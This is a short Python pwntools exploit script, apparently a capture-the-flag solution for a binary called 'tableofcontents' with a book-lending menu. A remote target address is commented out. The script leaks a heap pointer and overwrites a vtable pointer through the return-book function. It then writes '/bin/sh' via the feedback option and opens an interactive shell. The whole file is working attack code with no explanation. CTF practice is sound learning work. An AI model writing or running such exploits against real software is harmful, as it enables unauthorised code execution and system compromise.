from pwn import *

#target = remote('178.62.51.178', 32245)

target = process('./tableofcontents')

pid = gdb.attach(target, "\nb *add\nb *fetch+476\nb *return_book\nset disassembly-flavor intel\ncontinue")


def donate_book(title):
	print(target.recvuntil(b'5) Leave feedback'))
	target.sendline(b'1')
	print(target.recvuntil(b'title'))
	target.sendline(title)

def list_books():
	print(target.recvuntil(b'5) Leave feedback'))
	target.sendline(b'2')
	
def borrow_book(index):
	print(target.recvuntil(b'5) Leave feedback'))
	target.sendline(b'3')
	print(target.recvuntil(b'get?'))
	target.sendline(str(index))
	print(target.recvuntil(b'3) Tear out page'))
	target.sendline(b'1')
	print(target.recvuntil(b'is: '))
	pointer = target.recvline().strip()
	print(pointer)
	return(int(pointer, 16))
	
def return_book(ref_num):
	print(target.recvuntil(b'5) Leave feedback'))
	target.sendline(b'4')
	print(target.recvuntil(b'reference number'))
	target.sendline(hex(ref_num))

def feedback(index, my_feedback):
	print(target.recvuntil(b'5) Leave feedback'))
	target.sendline(b'5')
	print(target.recvuntil(b'feedback:'))
	target.sendline(str(index))
	print(target.recvuntil(b'Enter feedback:'))
	target.sendline(my_feedback)
	

#vtable overwrite
donate_book(p64(0x00401e30) * 6 + b'a' * (50 - (8 * 6)))

pointer = borrow_book(0)

print('Here is my heap leak', hex(pointer))

vtable_loc = pointer - 0x14f0
print('Here is where the vtable pointer is', hex(vtable_loc))

vtable_loc_off = vtable_loc - 0x8


return_book(vtable_loc_off - 0x100)
return_book(pointer)

feedback(0, '/bin/sh\x00')


target.interactive()
